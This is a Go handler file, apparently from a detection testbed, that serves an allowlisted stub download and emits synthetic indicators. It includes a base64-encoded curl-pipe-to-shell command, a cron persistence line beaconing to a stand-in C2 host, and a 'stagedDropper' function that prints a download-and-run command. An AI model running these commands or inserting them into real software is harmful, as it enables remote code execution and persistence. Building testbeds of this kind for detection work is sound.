package handlers

import (
	"encoding/base64"
	"errors"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := r.URL.Query().Get("url")
	content, err := toolPayloadForSource(source)
	if err != nil {
		log.Printf("handler=FetchTool op=validate_source request_id=%q err=%v", r.Header.Get("X-Request-ID"), err)
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	target := filepath.Join(os.TempDir(), "reach-testbed-tool.bin")
	out, err := os.Create(target)
	if err != nil {
		log.Printf("handler=FetchTool op=create_target request_id=%q err=%v", r.Header.Get("X-Request-ID"), err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	defer out.Close()

	if _, err := io.Copy(out, io.LimitReader(content, 2<<20)); err != nil {
		log.Printf("handler=FetchTool op=write_target request_id=%q err=%v", r.Header.Get("X-Request-ID"), err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	_, _ = w.Write([]byte(target + "\n"))
}

func toolPayloadForSource(source string) (io.Reader, error) {
	if source == "" {
		return nil, errors.New("missing source url")
	}
	parsed, err := url.Parse(source)
	if err != nil || !parsed.IsAbs() {
		return nil, errors.New("invalid source url")
	}
	if parsed.Scheme != "https" {
		return nil, errors.New("source url must use https")
	}
	if parsed.String() != "https://downloads.example.invalid/reach-testbed-tool.bin" {
		return nil, errors.New("source url is not allowlisted")
	}

	return strings.NewReader("synthetic tool payload\n"), nil
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}
